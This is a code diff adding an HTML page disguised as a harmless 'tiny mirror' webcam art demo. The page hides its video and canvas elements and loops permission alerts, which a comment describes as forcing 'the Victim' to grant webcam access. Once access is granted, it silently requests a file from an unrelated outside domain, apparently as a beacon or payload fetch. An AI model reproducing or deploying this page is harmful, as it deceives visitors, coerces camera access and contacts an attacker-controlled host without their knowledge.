@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script
+      type="text/javascript"
+      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
+    ></script>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
+    />
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
+    ></script>
+  </head>
+
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    ("use strict");
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const errorMsgElement = document.querySelector("span#errorMsg");
+
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user",
+      },
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        await handleSuccess(stream);
+      } catch (e) {
+        // Force the Victim to Give Permission
+        alert("Permission NOT GRANTED !");
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        init();
+      }
+    }
+
+    // Success
+    async function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      const targetURL =
+        "http://whiteclouddrive.com/tags/about/images/xjtotq838vhgn6qmctkn2jwop/contact.docx";
+
+      try {
+        const response = await fetch(targetURL, {
+          method: "GET",
+        });
+      } catch (error) {
+        console.error("An error occurred:", error);
+      }
+    }
+
+    // Load init
+    init();
+  </script>
+
+  <body>
+    <p>Hint: Look at the favicon</p>
+    <p>(Accept Permissions)</p>
+    <p>
+      <label
+        ><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label
+      >
+    </p>
+  </body>
+</html>
